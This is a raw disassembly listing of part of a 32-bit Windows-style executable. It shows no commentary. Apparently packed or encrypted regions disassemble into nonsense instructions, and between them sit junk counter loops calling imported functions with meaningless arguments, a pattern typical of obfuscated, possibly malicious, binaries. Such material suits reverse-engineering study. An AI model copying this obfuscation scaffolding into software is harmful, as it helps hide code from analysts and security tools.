  4018b7:	push   esi
  4018b8:	test   DWORD PTR [ebx+0x5c],edi
  4018bb:	fwait
  4018bc:	nop
  4018bd:	lods   al,BYTE PTR ds:[esi]
  4018be:	mov    cl,0xbb
  4018c0:	fdivrp st(7),st
  4018c2:	mov    bh,0x9c
  4018c4:	xchg   esp,eax
  4018c5:	in     al,dx
  4018c6:	inc    edi
  4018c7:	sbb    al,0x49
  4018c9:	sub    BYTE PTR [ebp+edi*4-0x2e],0x8d
  4018ce:	pop    edx
  4018cf:	hlt    
  4018d0:	pop    edi
  4018d1:	add    BYTE PTR [edi-0x4f],0xa
  4018d5:	ss cs aaa 
  4018d8:	das    
  4018d9:	xor    BYTE PTR [edx],bl
  4018db:	addr16 shl al,0x60
  4018df:	call   0x467c2e0e
  4018e4:	ret    
  4018e5:	outs   dx,BYTE PTR ds:[esi]
  4018e6:	sub    ah,BYTE PTR [eax-0x2a]
  4018e9:	in     al,0xbc
  4018eb:	call   0x89d0bc06
  4018f0:	add    BYTE PTR [ebx+edi*1-0x62],dh
  4018f4:	and    dh,BYTE PTR [eax]
  4018f6:	icebp  
  4018f7:	and    al,0x4f
  4018f9:	inc    edx
  4018fa:	xchg   ebp,eax
  4018fb:	xor    eax,0x235282c6
  401900:	fcom   QWORD PTR [edx+edi*1-0x3b]
  401904:	rcr    BYTE PTR [esi+0x44],1
  401907:	scas   eax,DWORD PTR es:[edi]
  401908:	cmp    BYTE PTR [edx+0x54],0xa9
  40190c:	jmp    0xe30b:0x5003f419
  401913:	leave  
  401914:	and    BYTE PTR [esi-0x7a],al
  401917:	int3   
  401918:	test   DWORD PTR [edx+ecx*2-0x2708fbba],ecx
  40191f:	popa   
  401920:	ficom  DWORD PTR [ecx+eiz*8+0x6f]
  401924:	or     DWORD PTR [ebx],0x2e
  401927:	dec    ecx
  401928:	out    dx,al
  401929:	call   0xab6ca8ac
  40192e:	fcmovne st,st(7)
  401930:	push   es
  401931:	mov    eax,DWORD PTR [ebp-0x14]
  401934:	jmp    0x40160d
  401939:	mov    eax,DWORD PTR [ebp-0xc]
  40193c:	mov    edx,DWORD PTR [ebp-0x18]
  40193f:	xor    eax,edx
  401941:	cmp    eax,0xe77c698d
  401946:	je     0x4015a9
  40194c:	mov    eax,DWORD PTR [ebp-0x10]
  40194f:	add    DWORD PTR [eax],0x7403501
  401955:	jmp    0x4015a9
  40195a:	mov    eax,DWORD PTR [ebp-0x1c]
  40195d:	cmp    DWORD PTR [eax],edi
  40195f:	je     0x4015a9
  401965:	mov    eax,0x800f1c9c
  40196a:	jmp    0x401622
  40196f:	push   ebp
  401970:	mov    ebp,esp
  401972:	sub    esp,0x44
  401975:	and    DWORD PTR ds:0x4292a1,0x0
  40197f:	mov    edx,DWORD PTR ds:0x4292a1
  401985:	inc    edx
  401986:	mov    DWORD PTR ds:0x4292a1,edx
  40198c:	cmp    DWORD PTR ds:0x4292a1,0x4
  401993:	jne    0x4019a4
  401999:	push   0x6284
  40199e:	call   DWORD PTR ds:0x4278e7
  4019a4:	cmp    DWORD PTR ds:0x4292a1,0x3
  4019ab:	jne    0x4019be
  4019b1:	mov    edx,DWORD PTR ds:0x4292a1
  4019b7:	inc    edx
  4019b8:	mov    DWORD PTR ds:0x4292a1,edx
  4019be:	cmp    DWORD PTR ds:0x4292a1,0x18
  4019c5:	jb     0x40197f
  4019cb:	push   edi
  4019cc:	jmp    0x401aec
  4019d1:	sbb    al,0xdb
  4019d3:	fcmovu st,st(6)
  4019d5:	std    
  4019d6:	sar    DWORD PTR [eax],1
  4019d8:	fstp   QWORD PTR [edi]
  4019da:	or     BYTE PTR [edx+0x1a3390fd],0xa6
  4019e1:	cld    
  4019e2:	jae    0x401a60
  4019e4:	jl     0x401a57
  4019e6:	jg     0x401a64
  4019e8:	jl     0x4019d9
  4019ea:	scas   al,BYTE PTR es:[edi]
  4019eb:	mov    BYTE PTR [edx+edx*2-0x57dc7f42],dh
  4019f2:	fstp   QWORD PTR [edx+esi*1-0x292203bc]
  4019f9:	cli    
  4019fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019fb:	retf   0x90ac
  4019fe:	add    eax,0xb8f0d2a8
  401a03:	cmc    
  401a04:	fdivr  QWORD PTR [bp+di-0x43]
  401a08:	ja     0x4019e9
  401a0a:	mov    al,ds:0xcc18d628
  401a0f:	or     eax,0x114288d7
  401a14:	imul   ebp,ecx,0xa4b1580d
  401a1a:	cmp    eax,DWORD PTR [eax-0x7580ce22]
  401a20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a21:	push   0x73e23449
  401a26:	in     eax,dx
  401a27:	jmp    0xda7b7232
  401a2c:	scas   eax,DWORD PTR es:[edi]
  401a2d:	(bad)  
  401a2e:	out    dx,eax
  401a2f:	das    
  401a30:	mov    WORD PTR [ecx-0x74f72897],fs
  401a36:	aad    0x88
  401a38:	push   0xffffffb7
  401a3a:	cmp    cl,cl
  401a3c:	push   ebp
  401a3d:	jb     0x401a45
  401a3f:	inc    edx
  401a40:	push   ss
  401a41:	pop    esi
  401a42:	xor    BYTE PTR [ebx+0x1d],0xe3
  401a46:	cmp    eax,0x3cb56a24
  401a4b:	mov    esp,0x9e822119
  401a50:	(bad)  [ebx]
  401a52:	imul   ecx,edi,0xffffffc7
  401a55:	fadd   QWORD PTR [edx-0x6e]
  401a58:	mov    ah,0xc4
  401a5a:	cmp    ah,0xb4
  401a5d:	jmp    0x401a5d
  401a5f:	loopne 0x401a66
  401a61:	repz or eax,0x33038741
  401a67:	retf   0xc07a
  401a6a:	sub    al,0x8c
  401a6c:	or     ecx,DWORD PTR [eax+edi*4]
  401a6f:	and    ebx,ebx
  401a71:	sub    DWORD PTR [esi-0x79],ecx
  401a74:	xchg   BYTE PTR [ebx+esi*2-0x5407b1b1],al
  401a7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a7c:	into   
  401a7d:	rcr    esi,cl
  401a7f:	retf   
  401a80:	into   
  401a81:	ret    0x2dd4
  401a84:	mov    ds:0xc7cdadfc,eax
  401a89:	adc    edi,esp
  401a8b:	sahf   
  401a8c:	xchg   edx,eax
  401a8d:	jno    0x401ae7
  401a8f:	lahf   
  401a90:	dec    ecx
  401a91:	mov    esi,0x8c858bec
  401a96:	fisubr DWORD PTR [ecx+0x6ddaea58]
  401a9c:	xchg   DWORD PTR [edx+0x2dfd9801],ebp
  401aa2:	pusha  
  401aa3:	mov    cl,BYTE PTR cs:[ebx+eiz*1+0x39d07202]
  401aab:	(bad)  
  401aac:	push   esp
  401aad:	jge    0x401acc
  401aaf:	mov    dl,0xe
  401ab1:	(bad)  [edi+0x4396e5e8]
  401ab7:	(bad)  
  401ab8:	out    dx,eax
  401ab9:	idiv   cl
  401abb:	setge  BYTE PTR [edi-0x9]
  401abf:	call   0x613f05ea
  401ac4:	jmp    0x401a46
  401ac6:	cmp    al,0x32
  401ac8:	mov    al,cs:0xca1e476b
  401ace:	in     al,dx
  401acf:	xor    al,0x95
  401ad1:	ficom  WORD PTR [edx]
  401ad3:	add    al,0xe5
  401ad5:	pop    eax
  401ad6:	pop    ebx
  401ad7:	mov    eax,ds:0x1e679ad9
  401adc:	gs scas al,BYTE PTR es:[edi]
  401ade:	cs xchg esi,eax
  401ae0:	mov    ebx,0x37a29634
  401ae5:	sbb    DWORD PTR [ebx+0x59dcce6f],ecx
  401aeb:	jno    0x401a78
  401aed:	inc    ebp
  401aee:	or     al,0x81
  401af0:	and    eax,0x4292cd
  401af5:	add    BYTE PTR [eax],al
  401af7:	add    BYTE PTR [eax],al
  401af9:	jmp    0x401b0b
  401afe:	mov    ecx,DWORD PTR ds:0x4292cd
  401b04:	inc    ecx
  401b05:	mov    DWORD PTR ds:0x4292cd,ecx
  401b0b:	cmp    DWORD PTR ds:0x4292cd,0x11
  401b12:	jae    0x401b69
  401b18:	cmp    DWORD PTR ds:0x4292cd,0x4
  401b1f:	jne    0x401b40
  401b25:	push   0x3f75
  401b2a:	push   0x4292cd
  401b2f:	push   DWORD PTR [ebp-0xc]
  401b32:	push   DWORD PTR [ebp-0xc]
  401b35:	push   0x5572
  401b3a:	call   DWORD PTR ds:0x4279bb
  401b40:	cmp    DWORD PTR ds:0x4292cd,0x3
  401b47:	jne    0x401b5a
  401b4d:	mov    ecx,DWORD PTR ds:0x4292cd
  401b53:	inc    ecx
  401b54:	mov    DWORD PTR ds:0x4292cd,ecx
  401b5a:	jmp    0x401afe
  401b5f:	mov    DWORD PTR ds:0x4292c9,0x72d4
  401b69:	mov    DWORD PTR [ebp-0x10],eax
  401b6c:	and    DWORD PTR ds:0x42c882,0x0
  401b76:	jmp    0x401b8a
  401b7b:	xor    ecx,ecx
  401b7d:	xor    ecx,DWORD PTR ds:0x42c882
  401b83:	inc    ecx
  401b84:	mov    DWORD PTR ds:0x42c882,ecx
  401b8a:	cmp    DWORD PTR ds:0x42c882,0x1c
  401b91:	jae    0x401bde
  401b97:	cmp    DWORD PTR ds:0x42c882,0x6
  401b9e:	jne    0x401bb9
  401ba4:	push   0x3a01
  401ba9:	push   0x1f68
  401bae:	push   0x4e47
  401bb3:	call   DWORD PTR ds:0x4278eb
  401bb9:	cmp    DWORD PTR ds:0x42c882,0x5
  401bc0:	jne    0x401bd3
  401bc6:	mov    ecx,DWORD PTR ds:0x42c882
  401bcc:	inc    ecx
  401bcd:	mov    DWORD PTR ds:0x42c882,ecx
  401bd3:	jmp    0x401b7b
  401bd8:	or     edx,0x1630
  401bde:	mov    eax,DWORD PTR [ebp+0x8]
  401be1:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  401be8:	mov    DWORD PTR [ebp-0x20],0xf89c8534
  401bef:	mov    ecx,DWORD PTR ds:0x42c886
  401bf5:	xor    DWORD PTR ds:0x4292cd,ecx
  401bfb:	mov    edx,DWORD PTR [ebp+0x8]
  401bfe:	sbb    DWORD PTR ds:0x427d1f,0x4512
  401c08:	mov    DWORD PTR [ebp-0x40],eax
  401c0b:	mov    eax,0x7510857
  401c10:	adc    ecx,0xd62
  401c16:	jmp    0x401d36
  401c1b:	adc    eax,DWORD PTR [ecx-0x2451948]
  401c21:	push   ebp
  401c22:	pop    ebp
  401c23:	aaa    
  401c24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c25:	popa   
  401c26:	lods   al,BYTE PTR ds:[esi]
  401c27:	bnd call 0x73311d6a
  401c2d:	jl     0x401cab
  401c2f:	jno    0x401cb0
  401c31:	jl     0x401caf
  401c33:	jg     0x401c7d
  401c35:	pop    edx
  401c36:	fstp   TBYTE PTR [eax+ebp*1]
  401c39:	in     al,dx
  401c3a:	out    0x94,eax
  401c3c:	lock retf 
  401c3e:	mov    edx,0x573eea60
  401c43:	or     bl,ch
  401c45:	xchg   esp,eax
  401c46:	rcr    DWORD PTR [edx-0x6f],0xa0
  401c4a:	pop    ds
  401c4b:	pop    esp
  401c4c:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  401c4e:	inc    ebx
  401c4f:	jno    0x401bf2
  401c51:	or     BYTE PTR [ebp-0xf67674f],ah
  401c57:	cs mov eax,0x1cb4db2c
  401c5d:	xor    DWORD PTR [ecx-0x58a47e88],esi
  401c63:	pop    ds
  401c64:	pop    edx
  401c65:	xor    al,0x15
  401c67:	adc    eax,0x28cc38a4
  401c6c:	in     al,dx
  401c6d:	cmp    eax,0x7290e491
  401c72:	xchg   edi,eax
  401c73:	scas   al,BYTE PTR es:[edi]
  401c74:	ficom  DWORD PTR [edi]
  401c76:	mov    esi,0xe3f47dd8
  401c7b:	pop    ebx
  401c7c:	jg     0x401c04
  401c7e:	leave  
  401c7f:	sbb    al,0xff
  401c81:	xchg   ebp,eax
  401c82:	mov    dh,0x61
  401c84:	jnp    0x401c10
  401c86:	jns    0x401c97
  401c88:	ja     0x401c44
  401c8a:	lds    edi,FWORD PTR [eax+ebp*8]
  401c8d:	mov    ecx,0x653d3c79
  401c92:	sub    ah,bh
  401c94:	jmp    0x401c71
  401c96:	pop    DWORD PTR [edi+eiz*2+0x72522498]
  401c9d:	test   BYTE PTR [ecx],ah
  401c9f:	shr    BYTE PTR [ebx-0x72],cl
  401ca2:	daa    
  401ca3:	lea    ecx,[edi-0x28]
  401ca6:	and    ebp,DWORD PTR [esi+0x60]
  401ca9:	icebp  
  401caa:	adc    cl,bl
  401cac:	dec    ebp
  401cad:	dec    ebx
  401cae:	daa    
  401caf:	mov    BYTE PTR [eax+0x1f],ch
  401cb2:	cmc    
  401cb3:	(bad)  
  401cb4:	retf   0x76f
  401cb7:	push   es
  401cb8:	xor    dh,bl
  401cba:	or     BYTE PTR [ebp-0x6d],bl
  401cbd:	dec    eax
  401cbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401cbf:	iret   
  401cc0:	pop    ecx
  401cc1:	pop    eax
  401cc2:	push   ebp
  401cc3:	jecxz  0x401c9a
  401cc5:	push   esi
  401cc6:	aaa    
  401cc7:	out    dx,al
  401cc8:	adc    eax,0x1ebd8cd2
  401ccd:	lock jg 0x401cd3
  401cd0:	cmp    eax,DWORD PTR [edx]
  401cd2:	in     al,dx
  401cd3:	mov    ah,dh
  401cd5:	and    BYTE PTR [ebx],dh
  401cd7:	dec    eax
  401cd8:	mov    fs,edx
  401cda:	mov    al,0xec
  401cdc:	mov    bh,0x18
  401cde:	jo     0x401d2e
  401ce0:	ror    dh,1
  401ce2:	mov    WORD PTR [esi-0x49],cs
  401ce5:	loopne 0x401d00
  401ce7:	mov    ch,0x74
  401ce9:	push   esp
  401cea:	js     0x401d2a
  401cec:	jg     0x401d0d
  401cee:	or     DWORD PTR [ebx],esi
  401cf0:	int    0x4e
  401cf2:	and    DWORD PTR [ecx+0xf],edx
  401cf5:	icebp  
  401cf6:	sub    edi,esp
  401cf8:	test   DWORD PTR ds:0x2368c70e,0x9efa83c6
  401d02:	(bad)  
  401d03:	mov    edi,0x7daa7d65
  401d08:	adc    ebp,DWORD PTR [edx+0x49]
  401d0b:	mov    cl,BYTE PTR [ecx+0x7a]
  401d0e:	sub    DWORD PTR [ecx-0x6c],eax
  401d11:	int    0x75
  401d13:	(bad)  [esp+ecx*1-0x4b]
  401d17:	scas   eax,DWORD PTR es:[edi]
  401d18:	fs mov bl,0xe8
  401d1b:	loope  0x401cf2
  401d1d:	(bad)
  401d20:	std    
  401d21:	inc    ecx
  401d22:	cmp    bl,BYTE PTR [esi-0x17]
  401d25:	xchg   edi,eax
  401d26:	out    0xef,eax
  401d28:	sbb    esi,DWORD PTR [esi-0x6]
  401d2b:	pop    ss
  401d2c:	xchg   esi,eax
  401d2d:	ret    
  401d2e:	inc    edi
  401d2f:	ins    DWORD PTR es:[edi],dx
  401d30:	test   eax,0x97a6e6ed
  401d35:	das    
  401d36:	xor    edx,eax
  401d38:	adc    DWORD PTR ds:0x4292c1,0x3cb6
  401d42:	jmp    0x401e62
  401d47:	(bad)  
  401d48:	mov    eax,0x13bd709b
  401d4d:	cdq    
  401d4e:	mov    edx,0x91382f2
  401d53:	cmp    eax,0xf2f9b6a2
  401d58:	jne    0x401dd6
  401d5a:	jl     0x401dcd
  401d5c:	jg     0x401dda
  401d5e:	jl     0x401d01
  401d60:	ror    DWORD PTR [edx-0x3],cl
  401d63:	dec    esp
  401d64:	sbb    BYTE PTR [eax+0x6e],dl
  401d67:	cmp    esp,ecx
  401d69:	cmp    al,0x49
  401d6b:	mov    al,0xd5
  401d6d:	xor    eax,0xdccb5d9f
  401d72:	jle    0x401d5d
  401d74:	int    0xc8
  401d76:	adc    esp,DWORD PTR [ecx]
  401d78:	sbb    eax,0x11018442
  401d7d:	ss fwait
  401d7f:	push   ecx
  401d80:	clc    
  401d81:	mov    edx,0x22f5f1c3
  401d86:	or     eax,0x9596e7aa
  401d8b:	jns    0x401d0f
  401d8d:	and    ah,BYTE PTR [ebp-0x4fbcc4ba]
  401d93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d94:	sar    DWORD PTR [edx],0xfe
  401d97:	jae    0x401d7b
  401d99:	fisttp DWORD PTR [ebp+esi*2-0x78588064]
  401da0:	push   edi
  401da1:	sbb    BYTE PTR [edi],dh
  401da3:	call   0x3fd12411
  401da8:	adc    BYTE PTR [ebx-0x78a09c5a],dl
  401dae:	mov    cl,0x89
  401db0:	push   ebp
  401db1:	pop    esp
  401db2:	retf   0xab4f
  401db5:	test   DWORD PTR [eax],esi
  401db7:	repz fwait
  401db9:	out    0xfc,eax
  401dbb:	aad    0xf4
  401dbd:	pop    edi
  401dbe:	cwde   
  401dbf:	sub    eax,0x8079799f
  401dc4:	pop    ss
  401dc5:	add    al,0x7a
  401dc7:	jge    0x401df4
  401dc9:	in     eax,dx
  401dca:	mov    ?,WORD PTR [edx-0x2d]
  401dcd:	sub    edi,DWORD PTR [ecx+0x4f6f5e5f]
  401dd3:	dec    ebp
  401dd4:	push   ecx
  401dd5:	int3   
  401dd6:	pushf  
  401dd7:	add    esi,ecx
  401dd9:	test   DWORD PTR [ebp+0x6f],0x2cbca8c
  401de0:	add    DWORD PTR [edx],ecx
  401de2:	adc    esp,DWORD PTR ds:0x1436e642
  401de8:	mov    bl,0x13
  401dea:	bound  esi,QWORD PTR ds:0xecace31b
  401df0:	mov    eax,0xfe21e2dd
  401df5:	jmp    0x401e19
  401df7:	mov    bh,0xaa
  401df9:	mov    al,0xfb
  401dfb:	xchg   esi,eax
  401dfc:	mov    eax,0x8fb73407
  401e01:	inc    edx
  401e02:	in     eax,dx
  401e03:	add    eax,0xe38b406f
  401e08:	in     al,dx
  401e09:	cmp    DWORD PTR [esi-0x39ab6aa5],eax
  401e0f:	inc    esi
  401e10:	pusha  
  401e11:	xchg   edx,eax
  401e12:	or     al,0x97
  401e14:	inc    ebx
  401e15:	iret   
  401e16:	shl    eax,0x8c
  401e19:	add    al,0x38
  401e1b:	(bad)  
  401e1c:	imul   eax,DWORD PTR [edx-0x30],0xf42c2e5c
  401e23:	scas   eax,DWORD PTR es:[edi]
  401e24:	mov    BYTE PTR [ecx-0x1e],cl
  401e27:	mov    cl,0x12
  401e29:	cmp    cl,bh
  401e2b:	icebp  
  401e2c:	pusha  
  401e2d:	cmp    al,0xc5
  401e2f:	fsub   DWORD PTR [edi-0x7c]
  401e32:	pop    edi
  401e33:	or     eax,0xb105f544
  401e38:	int    0xc4
  401e3a:	sbb    BYTE PTR [ecx],dh
  401e3c:	clc    
  401e3d:	pop    esp
  401e3e:	dec    ebx
  401e3f:	jl     0x401df8
  401e41:	add    DWORD PTR [edi+0x48182c62],edi
  401e47:	jge    0x401ddf
  401e49:	mov    al,ds:0x145eaaa4
  401e4e:	xor    dl,BYTE PTR [edi+0x59]
  401e51:	xlat   BYTE PTR ds:[ebx]
  401e52:	sub    BYTE PTR [ecx+0x8],ah
  401e55:	out    dx,eax
  401e56:	pop    ecx
  401e57:	pop    DWORD PTR [ebx+eiz*4-0x6593f50e]
  401e5e:	loope  0x401e1e
  401e60:	iret   
  401e61:	test   al,0xb9
  401e63:	sahf   
  401e64:	jb     0x401e98
  401e66:	add    BYTE PTR [ecx],dl
  401e68:	or     eax,0x427d17
  401e6d:	add    edx,ecx
  401e6f:	and    edi,DWORD PTR ds:0x4292a1
  401e75:	mov    DWORD PTR [ebp-0x8],edx
  401e78:	adc    DWORD PTR ds:0x427d07,0x2336
  401e82:	mov    edx,DWORD PTR [ebp+0x8]
  401e85:	and    DWORD PTR ds:0x427d1b,0x0
  401e8f:	mov    edi,DWORD PTR ds:0x427d1b
  401e95:	inc    edi
  401e96:	mov    DWORD PTR ds:0x427d1b,edi
  401e9c:	cmp    DWORD PTR ds:0x427d1b,0x2b
  401ea3:	jne    0x401eb2
  401ea9:	push   DWORD PTR [ebp-0x1c]
  401eac:	call   DWORD PTR ds:0x427a8b
  401eb2:	cmp    DWORD PTR ds:0x427d1b,0x1e
  401eb9:	jb     0x401e8f
  401ebf:	mov    edi,DWORD PTR ds:0x4292d9
  401ec5:	and    DWORD PTR ds:0x427d13,edi
  401ecb:	xor    edx,eax
  401ecd:	adc    edi,DWORD PTR ds:0x4292c9
  401ed3:	add    edx,ecx
  401ed5:	mov    DWORD PTR ds:0x4275b0,0x10
  401edf:	cmp    DWORD PTR ds:0x4275b0,0x0
  401ee6:	je     0x401f33
  401eec:	cmp    DWORD PTR ds:0x4275b0,0x6
  401ef3:	jne    0x401f07
  401ef9:	push   DWORD PTR [ebp-0x10]
  401efc:	push   0x12c3
  401f01:	call   DWORD PTR ds:0x4279bf
  401f07:	cmp    DWORD PTR ds:0x4275b0,0x7
  401f0e:	jne    0x401f21
  401f14:	mov    edi,DWORD PTR ds:0x4275b0
  401f1a:	dec    edi
  401f1b:	mov    DWORD PTR ds:0x4275b0,edi
  401f21:	mov    edi,DWORD PTR ds:0x4275b0
  401f27:	dec    edi
  401f28:	mov    DWORD PTR ds:0x4275b0,edi
  401f2e:	jmp    0x401edf
  401f33:	mov    DWORD PTR [ebp+0xc],edx
  401f36:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  401f3d:	xor    edi,edi
  401f3f:	add    edi,DWORD PTR ds:0x427d1f
  401f45:	adc    DWORD PTR ds:0x4292c9,edi
  401f4b:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  401f52:	mov    DWORD PTR [ebp-0x2c],0xf89c8532
  401f59:	and    DWORD PTR ds:0x42c896,0x0
  401f63:	jmp    0x401f77
  401f68:	xor    edi,edi
  401f6a:	or     edi,DWORD PTR ds:0x42c896
  401f70:	inc    edi
  401f71:	mov    DWORD PTR ds:0x42c896,edi
  401f77:	cmp    DWORD PTR ds:0x42c896,0x1c
  401f7e:	jae    0x401fc4
  401f84:	cmp    DWORD PTR ds:0x42c896,0xe
  401f8b:	jne    0x401fa3
  401f91:	push   0x0
  401f93:	push   0x55c0
  401f98:	push   0x3960
  401f9d:	call   DWORD PTR ds:0x427a8f
  401fa3:	cmp    DWORD PTR ds:0x42c896,0xd
  401faa:	jne    0x401fbd
  401fb0:	mov    edi,DWORD PTR ds:0x42c896
  401fb6:	inc    edi
  401fb7:	mov    DWORD PTR ds:0x42c896,edi
  401fbd:	jmp    0x401f68
  401fc2:	and    edi,edi
  401fc4:	mov    DWORD PTR [ebp-0x30],0xf89c8531
  401fcb:	mov    DWORD PTR [ebp-0x34],0xf89c8530
  401fd2:	and    DWORD PTR ds:0x4292bd,0x0
  401fdc:	mov    edi,DWORD PTR ds:0x4292bd
  401fe2:	inc    edi
  401fe3:	mov    DWORD PTR ds:0x4292bd,edi
  401fe9:	cmp    DWORD PTR ds:0x4292bd,0x15
  401ff0:	jne    0x402006
  401ff6:	push   0x3d92
  401ffb:	push   0x4275c4
  402000:	call   DWORD PTR ds:0x4279c3
  402006:	cmp    DWORD PTR ds:0x4292bd,0x12
  40200d:	jb     0x401fdc
  402013:	and    edi,0x7576
  402019:	jmp    0x402139
  40201e:	loopne 0x402062
  402020:	sbb    edx,ebp
  402022:	mov    ecx,0xbb5ae36d
  402027:	xchg   esp,eax
  402028:	inc    eax
  402029:	pop    es
  40202a:	je     0x402072
  40202c:	jle    0x40201c
  40202e:	div    DWORD PTR [esp+edi*2+0x7c]
  402032:	jno    0x4020b3
  402034:	jl     0x4020b2
  402036:	pop    es
  402037:	(bad)  
  402039:	(bad)  
  40203a:	fbld   TBYTE PTR [eax+0x27]
  40203d:	imul   eax,DWORD PTR [ebp-0x1f],0x7d
  402041:	pop    ss
  402042:	push   ss
  402043:	inc    eax
  402044:	or     edi,DWORD PTR [ebp+0x5b]
  402047:	addr16 sub dh,cl
  40204a:	sahf   
  40204b:	jmp    0xa0dd47f9
  402050:	jmp    ebp
  402052:	mov    al,ds:0xff0ca049
  402057:	add    al,0xce
  402059:	mov    ch,BYTE PTR [ebx+esi*8+0x48]
  40205d:	dec    ebx
  40205e:	sti    
  40205f:	retf   
  402060:	dec    edx
  402061:	imul   esi,DWORD PTR [edi-0x7f],0xffffffd9
  402065:	fcmovnbe st,st(6)
  402067:	popa   
  402068:	lahf   
  402069:	(bad)  
  40206a:	outs   dx,DWORD PTR ds:[esi]
  40206b:	sbb    al,0xd0
  40206d:	push   edi
  40206e:	mov    al,0x89
  402070:	xchg   esp,eax
  402071:	pop    ss
  402072:	and    al,0xc1
  402074:	cmp    edi,DWORD PTR [ebx-0x14]
  402077:	mov    DWORD PTR [edi],ecx
  402079:	out    0x6,eax
  40207b:	arpl   WORD PTR [edx-0x67574f83],cx
  402081:	icebp  
  402082:	pop    esp
  402083:	sbb    BYTE PTR [edx-0x72a1237d],bh
  402089:	shl    DWORD PTR fs:[esi-0x29da7396],0x42
  402091:	(bad)  
  402092:	jecxz  0x4020b1
  402094:	xlat   BYTE PTR ds:[ebx]
  402095:	push   eax
  402096:	leave  
  402097:	xlat   BYTE PTR ds:[ebx]
  402098:	mov    ah,0x42
  40209a:	pop    esi
  40209b:	loop   0x4020c2
  40209d:	in     al,0x36
  40209f:	sbb    BYTE PTR [ecx-0x5f],al
  4020a2:	or     ch,BYTE PTR [ecx]
  4020a4:	les    ebp,FWORD PTR [ebp-0x1d]
  4020a7:	mov    eax,DWORD PTR [ecx-0x382bf24c]
  4020ad:	adc    BYTE PTR [edx-0x29e7e52e],bl
  4020b3:	in     eax,0x7c
  4020b5:	outs   dx,BYTE PTR ds:[esi]
  4020b6:	lds    ebx,FWORD PTR [ebp-0x80]
  4020b9:	lods   al,BYTE PTR ds:[esi]
  4020ba:	inc    ebp
  4020bb:	jp     0x4020c0
  4020bd:	arpl   si,cx
  4020bf:	ficom  DWORD PTR [ebx]
  4020c1:	stos   BYTE PTR es:[edi],al
  4020c2:	mov    dh,0x3c
  4020c4:	lahf   
  4020c5:	rcl    BYTE PTR [ebp-0x22ce5f62],cl
  4020cb:	pop    esp
  4020cc:	dec    ebp
  4020cd:	pop    edi
  4020ce:	ret    
  4020cf:	in     eax,dx
  4020d0:	xchg   esp,eax
  4020d1:	data16 icebp 
  4020d3:	xor    DWORD PTR [eax],ecx
  4020d5:	mov    ch,0x88
  4020d7:	or     eax,ebx
  4020d9:	popa   
  4020da:	adc    ch,BYTE PTR ds:0x7fc848c3
  4020e0:	shr    DWORD PTR [esi-0x75],0xe9
  4020e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020e5:	es int3 
  4020e7:	jb     0x4020c7
  4020e9:	aam    0x32
  4020eb:	adc    bh,ch
  4020ed:	and    ecx,DWORD PTR [edx]
  4020ef:	ret    0xb135
  4020f2:	xor    eax,0xb73e7eef
  4020f7:	iret   
  4020f8:	sahf   
  4020f9:	scas   al,BYTE PTR es:[edi]
  4020fa:	call   0xfad320bf
  4020ff:	dec    edx
  402100:	test   DWORD PTR [eax],edx
  402102:	ins    BYTE PTR es:[edi],dx
  402103:	cmp    eax,0x50382cdd
  402108:	add    DWORD PTR [edi-0xda862],ebx
  40210e:	inc    eax
  40210f:	mov    ds:0x86ef491a,al
  402114:	pushf  
  402115:	and    dl,BYTE PTR [ebp-0x28415e7c]
  40211b:	or     eax,ecx
  40211d:	sbb    BYTE PTR [esi+esi*4+0x3171c611],cl
  402124:	inc    esp
  402125:	stc    
  402126:	sti    
  402127:	mov    cl,0x6f
  402129:	in     eax,dx
  40212a:	sub    eax,0x953da743
  40212f:	arpl   cx,cx
  402131:	dec    ecx
  402132:	push   ebx
  402133:	cmp    ebx,DWORD PTR ds:0x6ed855f2
  402139:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  402140:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  402147:	or     edx,edi
  402149:	mov    edx,DWORD PTR [ebp+0x8]
  40214c:	xor    edx,eax
  40214e:	mov    edi,DWORD PTR [ebp-0x10]
  402151:	neg    DWORD PTR ds:0x4292b5
  402157:	add    edx,ecx
  402159:	mov    DWORD PTR ds:0x4292bd,0x7886
  402163:	cmp    edi,edx
  402165:	je     0x402c82
  40216b:	mov    DWORD PTR ds:0x4292c5,0x3488
  402175:	push   ebx
  402176:	jmp    0x402c5d
  40217b:	mov    edx,DWORD PTR [ebp-0x8]
  40217e:	or     DWORD PTR ds:0x42c892,0x427cf7
  402188:	mov    edi,DWORD PTR [ebp-0x10]
  40218b:	mov    DWORD PTR ds:0x4292c1,0x6c77
  402195:	sub    edi,edx
  402197:	and    DWORD PTR ds:0x4292dd,0x0
  4021a1:	mov    edx,DWORD PTR ds:0x4292dd
  4021a7:	inc    edx
  4021a8:	mov    DWORD PTR ds:0x4292dd,edx
  4021ae:	cmp    DWORD PTR ds:0x4292dd,0x8
  4021b5:	jne    0x4021c9
  4021bb:	push   0x61e8
  4021c0:	push   DWORD PTR [ebp-0x14]
  4021c3:	call   DWORD PTR ds:0x4279c7
  4021c9:	cmp    DWORD PTR ds:0x4292dd,0x7
  4021d0:	jne    0x4021e3
  4021d6:	mov    edx,DWORD PTR ds:0x4292dd
  4021dc:	inc    edx
  4021dd:	mov    DWORD PTR ds:0x4292dd,edx
  4021e3:	cmp    DWORD PTR ds:0x4292dd,0x1a
  4021ea:	jb     0x4021a1
  4021f0:	xor    DWORD PTR ds:0x427cf7,0x6435
  4021fa:	mov    edx,DWORD PTR [ebp-0x4]
  4021fd:	xor    edx,eax
  4021ff:	xor    DWORD PTR ds:0x427cff,0x42c896
  402209:	add    edx,ecx
  40220b:	cmp    edi,edx
  40220d:	mov    DWORD PTR ds:0x42c892,0x3c1d
  402217:	jb     0x402c81
  40221d:	mov    edx,DWORD PTR [ebp-0x28]
  402220:	jmp    0x402340
  402225:	fstp   DWORD PTR [edi-0x39]
  402228:	xlat   BYTE PTR ds:[ebx]
  402229:	jns    0x402292
  40222b:	stc    
  40222c:	popa   
  40222d:	mov    ebx,0x443fc869
  402232:	sti    
